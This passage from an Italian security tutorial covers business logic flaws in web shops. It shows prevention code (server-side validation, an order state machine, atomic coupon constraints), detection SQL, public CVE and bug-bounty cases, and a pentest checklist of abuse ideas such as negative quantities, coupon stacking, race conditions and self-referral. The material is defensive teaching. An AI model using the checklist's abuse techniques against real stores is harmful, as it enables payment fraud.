Esempio dall'app di prova: *regola attesa*, un coupon vale una volta; *test*, 20 richieste parallele su `/api/coupon/apply`; *risultato*, 20 applicazioni, sconto del 200% e totale negativo; *impatto*, ordine pagato con saldo negativo, cioè accredito; *correzione*, vincolo di unicità nel database e controllo atomico.

## Come prevenire le Business Logic Vulnerabilities

Contro i logic flaw non esiste un filtro da installare: bisogna togliere la flawed logic alla fonte, con regole chiare e imposte dal server.

**Il server decide, sempre.** Prezzi, totali, sconti, ruoli e stato dell'ordine si ricalcolano lato server. Il client invia identificativi (`product_id`, `qty`), mai valori economici.

**Valida con una whitelist di valori ammessi**, non con una blacklist di valori cattivi:

```python
# Validate against what is allowed, not against what is bad
def validate_quantity(qty, stock):
    if not isinstance(qty, int) or isinstance(qty, bool):
        raise ValueError("quantity must be an integer")
    if qty < 1 or qty > min(stock, 10):
        raise ValueError("quantity out of range")
    return qty
```

**Fai rispettare la sequenza con una macchina a stati**, lato server:

```python
# Each transition is allowed only from the right previous state
ALLOWED = {
    "cart": {"address"},
    "address": {"payment"},
    "payment": {"confirmed"},
}

def move(order, new_state):
    if new_state not in ALLOWED.get(order.state, set()):
        raise PermissionError("invalid transition")
    order.state = new_state
```

**Rendi atomici i limiti.** Il vincolo deve stare nel database, non in un `if` dell'applicazione:

```sql
-- One redemption per user and coupon, enforced by the database
CREATE UNIQUE INDEX uq_coupon_user ON coupon_redemptions (coupon_id, user_id);

-- Atomic "use once": only one request can flip the flag
UPDATE coupons SET used = 1 WHERE code = 'WELCOME10' AND used = 0;
-- If 0 rows were affected, the coupon was already used: reject the request
```

**Ricalcola ogni regola a ogni modifica del carrello** (soglie e sconti non si controllano una volta sola), **normalizza i codici** prima di confrontarli (`upper()`), **arrotonda in un solo punto** con numeri decimali o interi in unità minime (mai float), **rimborsa esattamente quanto è stato addebitato** e revoca l'accesso nello stesso passaggio del rimborso.

**Scrivi i test di abuso insieme ai test funzionali**: per ogni regola ("il coupon vale una volta") un test che prova a violarla.

## Come rilevare gli abusi di business logic

Nessun WAF vede questi segnali, ma il database sì. Query di controllo da schedulare:

```sql
-- Orders with a non-positive total
SELECT id, user_id, total FROM orders WHERE total <= 0;

-- Coupons redeemed more than once by the same user
SELECT coupon_id, user_id, COUNT(*) FROM coupon_redemptions
GROUP BY coupon_id, user_id HAVING COUNT(*) > 1;

-- Orders refunded for more than their original payment
SELECT o.id FROM orders o JOIN refunds r ON r.order_id = o.id
GROUP BY o.id, o.total HAVING SUM(r.amount) > o.total;
```

E allarmi su: importi negativi o a zero nelle richieste, sconti sopra una percentuale massima, più riscatti dello stesso coupon in pochi millisecondi, rimborsi seguiti da accessi al prodotto, molti account nuovi che usano lo stesso referral, conferme d'ordine senza pagamento.

## Esempi reali

Tre casi pubblici, utili per vedere come una flawed logic emerga anche in prodotti maturi:

* **CVE-2022-1155 (Snipe-IT)**: le vecchie sessioni non venivano bloccate dalla funzione che disattiva il login. L'utente "disabilitato" restava dentro: è un difetto nella gestione delle sessioni, un caso in cui la regola di business ("disabilitato significa fuori") non era imposta ovunque.
* **HackerOne #176461**: arrotondamento che crea valuta, descritto nella sezione sugli arrotondamenti.
* **USPS Informed Visibility (2018)**: un'API permetteva a utenti autenticati di consultare e, in alcuni casi, modificare informazioni di altri account. È principalmente un problema di controllo degli accessi, qui citato perché mostra quanto un'API possa fidarsi troppo di una richiesta valida.

## Checklist operativa

**Prezzo e quantità**

* Quantità negativa, zero, enorme, decimale
* Prezzo modificabile dal client?
* Integer overflow
* Arrotondamento e cambio valuta

**Workflow**

* Step obbligatori saltabili?
* Ordine degli step invertibile?
* Step ripetibili (doppio rimborso)?
* Modifica dell'ordine dopo il pagamento?
* Importo pagato verificato lato server?
* 2FA: accesso a una risorsa protetta senza codice?

**Coupon e sconti**

* Stacking, case sensitivity, coupon su prezzo scontato
* Soglia ricontrollata dopo ogni modifica del carrello?
* Coupon dopo il pagamento, scadenza con timestamp del client
* Gift card + coupon in loop
* Race condition sul riscatto

**Referral e bonus**

* Self-referral con email usa e getta
* Verifica email, transazione minima, limiti per IP/dispositivo

**Ruoli e piani**

* Upgrade senza pagamento, mass assignment su `role` e `plan`
* Rimborso che mantiene l'accesso, downgrade che lascia le funzioni premium
* Limiti del piano free aggirabili con più account

**Parametri**

* Ogni parametro omesso (nome e valore), tipo sbagliato, valore vuoto

## FAQ sulle Business Logic Vulnerabilities

**Cos'è una business logic vulnerability?**
Chiamata anche business logic flaw o logical flaw (al plurale, business logic flaws), è un difetto nella progettazione o nell'implementazione delle regole di un'applicazione, che permette azioni non previste (riusare un coupon, saltare il pagamento, accreditarsi denaro) con richieste HTTP valide.

**Gli scanner automatici trovano i Business Logic Flaw?**
Gli scanner generici spesso non li individuano perché non conoscono le regole del processo. Alcune anomalie possono emergere da controlli automatizzati, ma il test manuale resta fondamentale per capire il comportamento atteso e dimostrare l'impatto.

**Come si testano le business logic vulnerabilities?**
Mappando il flusso, scrivendo le regole, rompendole una alla volta (salto di step, ripetizione, valori ai limiti, richieste parallele) e controllando lo stato finale, non solo la risposta. [Burp Suite](https://hackita.it/articoli/burp-suite/), `curl` e Python bastano.

**Qual è la differenza tra Business Logic Flaw e Race Condition?**
La Race Condition sfrutta il timing (richieste parallele prima dell'aggiornamento dello stato). Il Business Logic Flaw sfrutta la logica (valore negativo, step saltato, coupon accumulato). Possono coesistere.

**Qual è la differenza tra Business Logic Flaw e IDOR?**
L'IDOR è un controllo di accesso mancante su un oggetto (cambi un ID e vedi i dati di un altro). Il Business Logic Flaw è una regola di processo sbagliata. Un IDOR nel carrello può essere il mezzo con cui sfrutti un difetto di logica.

**Dove si trovano più spesso i logic flaw?**
I logic flaws compaiono soprattutto in checkout, coupon, trasferimenti di denaro, registrazione, reset password, piani premium, rimborsi e ogni funzione in cui un valore economico o un permesso dipende da una sequenza di passaggi.

**Come si previene?**
Ricalcolando tutto lato server, usando una macchina a stati per le sequenze, mettendo i limiti nel database in modo atomico, arrotondando in un solo punto e monitorando le anomalie di business.

**Come si riportano in un pentest o in un bug bounty?**
Descrivendo regola attesa, test, risultato osservato, impatto verificato e correzione, con una richiesta replicabile e una prova dello stato prima e dopo.

## Conclusione

I Business Logic Flaw (chiamali logic flaw o logical flaws: cambia il nome, non il metodo) premiano chi capisce il business prima del codice. Mappa il flusso, scrivi le regole, rompile una alla volta e controlla lo stato finale. Per approfondire le gare tra richieste parti dall'articolo sulle [race condition](https://hackita.it/articoli/race-condition/).

Se vuoi portarti dietro un pezzo di Hackita mentre studi, nello [shop di Hackita](https://shop.hackita.it/) trovi il merchandising per chi vive di pentest e bug bounty.

Per allenarti, i laboratori di [PortSwigger Web Security Academy](https://portswigger.net/web-security/logic-flaws) coprono la maggior parte dei pattern di questa guida.
